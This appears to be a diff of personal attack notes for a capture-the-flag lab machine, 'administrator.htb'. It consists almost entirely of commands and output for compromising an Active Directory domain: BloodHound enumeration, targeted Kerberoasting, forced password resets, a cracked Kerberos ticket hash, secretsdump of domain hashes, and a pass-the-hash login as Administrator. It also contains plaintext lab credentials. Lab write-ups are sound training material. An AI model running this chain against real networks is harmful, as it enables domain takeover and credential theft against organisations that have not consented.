@@ -73,7 +73,7 @@ netexec ldap 10.10.11.42 -u olivia -p ichliebedich  --bloodhound --collection Al
 python3 /home/milo/Desktop/OffSec_narzedzia/BloodHound.py-bloodhound-ce/bloodhound.py -d administrator.htb -u olivia -p ichliebedich -c All -op default_kali_bloodhoundpy --zip  -ns 10.10.11.42
 
 timedatectl set-ntp off
-rdate -n [IP of Target]
+rdate -n 10.10.11.42
 python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' --request-user 'michael' --dc-ip 10.10.11.42 
 
 
@@ -84,7 +84,7 @@ https://github.com/CravateRouge/bloodyAD
 bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p 'ichliebedich' set password michale 'Password123!'
 
 evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
-net user michael password1 /domain
+net user /domain michael password1 
 evil-winrm -i 10.10.11.42 -u 'michael' -p 'password1'
 net rpc password "benjamin" "newP@ssword2022" -U "administrator"/"michael"%"password1" -S "administrator.htb"
 crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'newP@ssword2022'
@@ -97,4 +97,17 @@ tekieromucho     (Backu)
 
 emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
 
+timedatectl set-ntp off
+sudo rdate -n 10.10.11.42
+
+python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user 'ethan' --dc-ip 10.10.11.42 
+
+
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$71f14554c92fbf0ce9f71bdbff08306a$5c3b9a810d46f0eb80f1afcfbd69c5984c2f7a5c29b2229dee57f8dcf44af43e5a114965428b5f82816b6dcc82e2849c64253d597a1f6c01b21342c915d7bbb7ea341c76d7c392c4983e3f8accad075bbbbd134bdf07de4505fb03ae52a8433a486d987742e4b8e78eb6b7280ea68e0b7c3e0cffa4a579fb10d9666a7053d81f45d525bfcc16bf72a9028a886dc301a1542582f4e85fd3fe21a21068fc6c7808c571f6ed6058ca926fd512acb9efb5987decc3383ab4571e9fa9068be6e1c956f5cce4e3920f8fcb7eff5ad956fc77f32ee3f705869819d9380b972114b094259a542bf4ae585a76381ecd06bc57c500a55a4f3f6fd95b42b1387b3ab174840c8a30dd4f61d1ed6f626de06af08f6fcb259adf5f8daee0a9264b46dc5b43f6df8d20e0dbf15abe4600141ac10a9d7992631617cd428d830d5c6c783edad3e6955e6c0d647f4c79706fbca195a50a0c7d18a444f8305c3644529f4b0da5cf93c499b825c4141f4ad47a016e7e7624d4dc660bdf3523d48653a103b1a8af61a2e8cada37280f1d40372ff245fbe8d30355258050d55c38cb384fad0e5fc3db955f6a89abd92bc7a71b1ec2b35eff2ec1a518f2fd6084b4028ea6a91963ccd9b6fcf99944438f3b15d1c8817f5fac6e5971310441ed86c40f1b9079017f0a30fc4e8f3c5f086d439666f39f3e08f12fed9c462b71d6995e954b97d1291188348be716dd70a42ae4b45c6b6302d58010d7a59d5ccc794918d5968ba55bafb66e52f2da5f35c57c8d2a59859656374add58ddabffa232225b7d72eefebbc5210b18a448bb018539a3e6cdc36159c2bc5ef55ebd246598d1d7e222577c07953b9bb0c6c88f1c2064b954641d5bf90fb2b825927644f549e3a4f45c5023db63376985d29e9e955457751b3aec282cbacca6fa33e5f87c5f6a4be038a51767cc1d630145c9c55da9689274d8b442f6331ef37459693250554a71325571afa977a07d3ccf29629a52f0d5f0f57ae81b37a80a832b535c8369901d8bc29129acd40454a8dffd5d7c1b7c0facb63568ba3fcbb47ff441ff9a6abb46ea02120eb2eaa040020b983f247fb8aee959f30267df1d5630a8537a10bd4da5d12c6c3a5755f5b7cdb17240601158e6369d20989a2732feafbdbc740d2e9980faf760d513935d5d710dee2cb5897357528db91550d997bb37927f84b307fdecb84c9b43c05e54e1c07a55d670d47b7f4c364f4dc8e0e78d6424622039ae153536ec2f7e9bea37dd4e4f55e059c89f201b03c325cffdf0bad27ebc4df54ca8d00165f9403e3dc1d495d2f4603db2f511f5050b70aaad1e8ad4a39b4c4d6549d00e36a7db18767e80c972d46abecf6debabeb3b4487f6d3e06d72168c21c27f3c8618a3b4cd58709e52aa116b4a80f6d7480c6015035fb4c3ae6f7ee97dfffc45bc4914c1f1789dc101f782f134fc73b93a5177dae28d5c657b4d83c99b76057d2536eb71b8ed673328086b987d0029111cc1eaaa17733921299e14064d153e0a85667e92c59b84ba9e:limpbizkit
+
+impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'10.10.11.42'
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+
+└─$ evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e' 
 
